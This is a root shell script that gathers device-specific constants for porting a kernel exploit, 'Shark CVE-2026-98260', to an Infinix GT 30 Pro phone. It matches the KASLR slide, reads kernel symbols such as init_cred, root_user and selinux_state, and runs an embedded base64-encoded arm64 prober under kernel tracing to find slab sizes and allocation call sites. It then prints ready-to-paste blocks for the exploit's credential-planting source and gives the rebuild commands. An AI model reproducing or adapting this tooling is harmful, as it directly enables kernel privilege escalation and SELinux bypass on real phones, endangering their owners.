#!/system/bin/sh
# derive-consts.sh — Infinix GT 30 Pro (X6873) on-device constants
# derivation for the Shark CVE-2026-98260 port.
#
# Run as root on the target device (temporary root is fine, e.g. right
# after a GhostLock session, before rebooting):
#
#     adb push ports/x6873/tools/derive-consts.sh /data/local/tmp/
#     adb shell
#     su
#     sh /data/local/tmp/derive-consts.sh
#
# The script:
#   1. verifies uname -r matches the target release,
#   2. pins the KASLR slide against three GhostLock-measured image
#      offsets (aborts on disagreement — different kernel build),
#   3. extracts panic_on_warn / root_user / init_user_ns / init_ucounts /
#      init_groups from kallsyms into the port base frame,
#   4. runs an embedded static arm64 prober (one CPU posix timer + one
#      fork) under the kmem_cache_alloc tracer and recovers the
#      do_timer_create / dup_task_struct call sites and the slab sizes,
#   5. prints the ready-to-paste block for exploit/src/K61157_plant.c and
#      the slab defines for the X6873_61157 branch of plant_core.inc.
#
# Portability: pure shell (mksh/toybox/dash/bash), no awk/sed/python.
# All 64-bit address math is done on 32-bit halves (results are < 2^31
# and the slide is common across symbols, so mod-2^32 arithmetic is
# exact), because several shells reject hex literals above INT64_MAX.
#
# Nothing is written anywhere outside /data/local/tmp/x6873_derive.

RELEASE="6.1.157-android14-11-ga8b0b542991e-ab15601211"

# Port base frame — see ports/x6873/README.md. Only internal consistency
# matters (the engine slide cancels a constant shift), but we keep the
# same 0xffffffc080000000 frame as the other Shark GKI ports.
BASE_HI_HEX=ffffffc0
BASE_LO=0x80000000

# GhostLock-measured kernel image offsets for this exact release.
A_INIT_TASK=0x201f640
A_INIT_CRED=0x2031aa8
A_ROOT_TASK_GROUP=0x2209980
A_SELINUX_ENFORCING=0x225b820

WORK="${X6873_WORK:-/data/local/tmp/x6873_derive}"
KS="${X6873_KALLSYMS:-/proc/kallsyms}"
SLABINFO="${X6873_SLABINFO:-/proc/slabinfo}"
TR="${X6873_TRACEFS:-}"
UNAME_R="${X6873_RELEASE:-$(uname -r)}"
PROBE_BIN="${X6873_PROBE:-}"          # test hook: use a mock prober
ALLOW_NONROOT="${X6873_ALLOW_NONROOT:-}"  # test hook only

say() { printf '%s\n' "$*"; }
die() {
    printf 'ERROR: %s\n' "$*" >&2
    printf 'DERIVATION ABORTED — nothing usable was printed.\n' >&2
    exit 1
}

# hex helpers: addresses are 16 hex digits (arm64); lo = last 8, hi = first 8.
addr_lo() { h=$1; while [ ${#h} -lt 8 ]; do h="0$h"; done; printf '%s' "$h" | tail -c 8; }
addr_hi() { h=$1; while [ ${#h} -lt 8 ]; do h="0$h"; done; printf '%s' "$h" | head -c 8; }

# ---------------------------------------------------------------- 1. env
if [ "$(id -u)" != "0" ] && [ -z "$ALLOW_NONROOT" ]; then
    die "run as root: su -c 'sh $0'"
fi
[ "$UNAME_R" = "$RELEASE" ] || die "uname -r '$UNAME_R' != target '$RELEASE'"
[ -r "$KS" ] || die "$KS is not readable (need root)"
[ -r "$SLABINFO" ] || die "$SLABINFO is not readable (need root)"

if [ -z "$TR" ]; then
    if [ -d /sys/kernel/tracing ]; then TR=/sys/kernel/tracing
    elif [ -d /sys/kernel/debug/tracing ]; then TR=/sys/kernel/debug/tracing
    else TR=""; fi
fi
[ -n "$TR" ] || die "no tracefs found (/sys/kernel/tracing, /sys/kernel/debug/tracing)"

# ------------------------------------------------------- 2. kallsyms base
# pure-shell symbol lookup
sym() {
    want="$1" addr="" found=0
    while read -r a t n rest; do
        [ "$n" = "$want" ] || continue
        addr=$a; found=1; break
    done < "$KS"
    [ "$found" = "1" ] || return 1
    printf '%s' "$addr"
}

RT_init_task=$(sym init_task)      || true
RT_init_cred=$(sym init_cred)      || true
RT_root_task_group=$(sym root_task_group) || true
RT_selinux_state=$(sym selinux_state)     || true
RT_panic_on_warn=$(sym panic_on_warn)     || true
RT_root_user=$(sym root_user)             || true
RT_init_user_ns=$(sym init_user_ns)       || true
RT_init_ucounts=$(sym init_ucounts)       || true
RT_init_groups=$(sym init_groups)         || true

[ -n "$RT_init_task" ] && [ -n "$RT_init_cred" ] && [ -n "$RT_root_task_group" ] ||
    die "kallsyms anchor symbols missing (init_task/init_cred/root_task_group) — wrong kallsyms?"

# slide (mod 2^32) from each anchor; all must agree.
slide_of() { # $1 = runtime hex, $2 = image offset
    rt_lo=$(( 0x$(addr_lo "$1") ))
    lk_lo=$(( BASE_LO + $2 ))
    v=$(( rt_lo - lk_lo ))
    while [ "$v" -lt 0 ]; do v=$(( v + 4294967296 )); done
    v=$(( v % 4294967296 ))
    echo "$v"
}
S1=$(slide_of "$RT_init_task" "$A_INIT_TASK")
S2=$(slide_of "$RT_init_cred" "$A_INIT_CRED")
S3=$(slide_of "$RT_root_task_group" "$A_ROOT_TASK_GROUP")
if [ "$S1" != "$S2" ] || [ "$S2" != "$S3" ]; then
    die "slide anchors disagree ($S1 / $S2 / $S3) — kernel build does not match the GhostLock profile"
fi
SLIDE=$S1
say "[ok] release matched: $UNAME_R"
say "[ok] KASLR slide pinned from 3 anchors (low32 decimal): $SLIDE"

# Missing data symbols (possible when KALLSYMS_ALL is off) are reported
# and left pending; the anchors above are the mandatory ones.
PENDING_SYMS=""
for s in panic_on_warn root_user init_user_ns init_ucounts init_groups; do
    eval "v=\$RT_$s"
    [ -n "$v" ] || PENDING_SYMS="$PENDING_SYMS $s"
done
if [ -n "$PENDING_SYMS" ]; then
    say "[warn] kallsyms lacks data symbols:$PENDING_SYMS"
    say "[warn] they stay PENDING — derive them from a stock boot.img on the host instead (ports/x6873/README.md)"
fi

# linked offset (from BASE, exact, < 2^31) of a runtime hex address
loff() { # $1 = runtime hex
    v=$(( 0x$(addr_lo "$1") - SLIDE - BASE_LO ))
    while [ "$v" -lt 0 ]; do v=$(( v + 4294967296 )); done
    v=$(( v % 4294967296 ))
    if [ "$v" -ge 2147483648 ]; then v=$(( v - 4294967296 )); fi
    echo "$v"
}
# full linked address string in the port frame
hexaddr() { printf '0x%s%08x' "$BASE_HI_HEX" $(( BASE_LO + $1 )); }

if [ -n "$RT_selinux_state" ]; then
    SEL_DELTA=$(loff "$RT_selinux_state")
    SEL_DELTA=$(( SEL_DELTA - A_SELINUX_ENFORCING ))
    say "[info] selinux_state symbol vs measured enforcing address delta: $SEL_DELTA (small = enforcing near struct start; the plant constant uses the measured address)"
fi

# ------------------------------------------------------ 3. slab geometry
slabsize() { # $1 = cache name -> objsize
    while read -r name rest; do
        [ "$name" = "$1" ] || continue
        set -- $name $rest
        echo "$4"
        return 0
    done < "$SLABINFO"
    return 1
}
SZ_TIMER=$(slabsize posix_timers_cache) || die "slabinfo has no posix_timers_cache row"
SZ_CRED=$(slabsize cred_jar) || die "slabinfo has no cred_jar row"
SZ_TASK=$(slabsize task_struct) || die "slabinfo has no task_struct row"
say "[ok] slab sizes: posix_timers_cache=$SZ_TIMER cred_jar=$SZ_CRED task_struct=$SZ_TASK"

# ------------------------------------------------------- 4. trace window
EVT="$TR/events/kmem/kmem_cache_alloc/enable"
[ -w "$EVT" ] || die "$EVT is not writable (root?)"
EVT_NODE="$TR/events/kmem/kmem_cache_alloc_node/enable"

mkdir -p "$WORK" || die "cannot create $WORK"
printf '%s' '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' | base64 -d > "$WORK/x6873_probe" 2>/dev/null || die "prober decode failed"
chmod 755 "$WORK/x6873_probe"
[ -n "$PROBE_BIN" ] || PROBE_BIN="$WORK/x6873_probe"

echo 0 > "$TR/tracing_on" 2>/dev/null
echo > "$TR/trace" 2>/dev/null
echo 1 > "$EVT"
if [ -w "$EVT_NODE" ]; then echo 1 > "$EVT_NODE"; fi

"$PROBE_BIN" > "$WORK/probe.out" 2>&1 &
P=$!
wait "$P"

echo 0 > "$EVT"
if [ -w "$EVT_NODE" ]; then echo 0 > "$EVT_NODE"; fi
echo 0 > "$TR/tracing_on" 2>/dev/null

grep -q PROBE_TIMER_OK "$WORK/probe.out" || die "prober timer_create failed (see $WORK/probe.out)"
grep -q PROBE_DONE "$WORK/probe.out" || die "prober did not finish (see $WORK/probe.out)"

# ------------------------------------------------ 5. trace record parsing
# find_rec SIZE -> first kmem_cache_alloc record of pid $P with bytes_req=SIZE
# prints "call_site=<v> bytes_req=<n> bytes_alloc=<n>"
find_rec() {
    want_sz="$1"
    while IFS= read -r line; do
        case "$line" in
        *kmem_cache_alloc*) ;;
        *) continue ;;
        esac
        set -- $line
        first=$1
        case "$first" in
        *-"$P") ;;
        *) continue ;;
        esac
        cs=""; req=""; alloc=""
        for w in $line; do
            case "$w" in
            call_site=*)    cs=${w#call_site=} ;;
            bytes_req=*)    req=${w#bytes_req=} ;;
            bytes_alloc=*)  alloc=${w#bytes_alloc=} ;;
            esac
        done
        [ "$req" = "$want_sz" ] || continue
        printf 'call_site=%s bytes_req=%s bytes_alloc=%s\n' "$cs" "$req" "$alloc"
        return 0
    done < "$TR/trace"
    return 1
}

# call_site to linked offset: "0xffffffc0831a4dfc" or "do_timer_create+0x8c"
site_loff() {
    cs="$1"
    case "$cs" in
    0x*)
        h=${cs#0x}
        loff "$h"
        ;;
    *)
        sn=${cs%+*}
        so=${cs##*+}
        rs=$(sym "$sn") || return 1
        # runtime site low32 = sym low32 + off (mod 2^32), then to frame
        v=$(( 0x$(addr_lo "$rs") + $so ))
        v=$(( v % 4294967296 ))
        h=$(printf '%08x' "$v")
        loff "$h"
        ;;
    esac
}

TLINE=$(find_rec "$SZ_TIMER") || die "no posix timer alloc record found in trace"
CLINE=$(find_rec "$SZ_CRED")  || die "no cred_jar alloc record found in trace"
KLINE=$(find_rec "$SZ_TASK")  || die "no task_struct alloc record found in trace"

getf() { # $1 = field prefix, $2 = record
    for w in $2; do
        case "$w" in
        "$1"*) echo "${w#$1}"; return 0 ;;
        esac
    done
    return 1
}

TIMER_REQ_V=$(getf bytes_req= "$TLINE")
TIMER_ALLOC_V=$(getf bytes_alloc= "$TLINE")
CRED_REQ_V=$(getf bytes_req= "$CLINE")
CRED_ALLOC_V=$(getf bytes_alloc= "$CLINE")
TASK_REQ_V=$(getf bytes_req= "$KLINE")
TASK_ALLOC_V=$(getf bytes_alloc= "$KLINE")

OFF_TIMER=$(site_loff "$(getf call_site= "$TLINE")") || die "cannot resolve timer call_site"
OFF_TASK=$(site_loff "$(getf call_site= "$KLINE")") || die "cannot resolve task call_site"
[ "$OFF_TIMER" -gt 0 ] && [ "$OFF_TIMER" -lt 1073741824 ] || die "timer site out of frame: $OFF_TIMER"
[ "$OFF_TASK" -gt 0 ] && [ "$OFF_TASK" -lt 1073741824 ] || die "task site out of frame: $OFF_TASK"
LOW21_TIMER=$(( OFF_TIMER & 0x1fffff ))
LOW21_TASK=$(( OFF_TASK & 0x1fffff ))

say "[ok] timer site : $(hexaddr "$OFF_TIMER") (low21 $(printf '0x%x' "$LOW21_TIMER"))"
say "[ok] copy site  : $(hexaddr "$OFF_TASK") (low21 $(printf '0x%x' "$LOW21_TASK"))"

# ------------------------------------------------------------- 6. output
emit_sym() { # $1 = RT_ variable name
    eval "v=\$RT_$1"
    if [ -n "$v" ]; then
        hexaddr "$(loff "$v")"
    else
        echo "0x0"
    fi
}

say ""
say "================ paste into exploit/src/K61157_plant.c (profile row) ==============="
say "    {"
say "        \"6.1.157-android14-11-ga8b0b542991e-ab15601211\","
say "        $(hexaddr "$OFF_TIMER")ULL,  /* timer_site    */"
say "        $(printf '0x%x' "$LOW21_TIMER")ULL,  /* timer_low21   */"
say "        $(printf '0x%x' "$LOW21_TASK")ULL,  /* copy_low21    */"
say "        0xffffffc08225b827ULL, /* selinux_state (prefilled, measured) */"
say "        $(emit_sym panic_on_warn)ULL,  /* panic_on_warn */"
say "        $(emit_sym root_user)ULL,  /* root_user     */"
say "        $(emit_sym init_user_ns)ULL,  /* init_user_ns  */"
say "        $(emit_sym init_ucounts)ULL,  /* init_ucounts  */"
say "        $(emit_sym init_groups)ULL,  /* init_groups   */"
say "    },"
say ""
say "================ paste into plant_core.inc (X6873_61157 branch) ==================="
say "#define TIMER_REQ  0x$(printf '%x' "$TIMER_REQ_V")ULL"
say "#define TIMER_ALLOC 0x$(printf '%x' "$TIMER_ALLOC_V")ULL"
say "#define CRED_REQ  0x$(printf '%x' "$CRED_REQ_V")ULL"
say "#define CRED_ALLOC 0x$(printf '%x' "$CRED_ALLOC_V")ULL"
say "#define TASK_ALLOC_BYTES 0x$(printf '%x' "$TASK_REQ_V")ULL"
say "#define TASK_ALLOC_PADDED 0x$(printf '%x' "$TASK_ALLOC_V")ULL"
say ""
say "Then rebuild: ./exploit/build-all.sh && (cd app && ./gradlew :app:assembleRelease)"
say "The pending guard in K61157_plant.c clears itself once every field is non-zero."

rm -rf "$WORK"
say "[done] workdir cleaned"
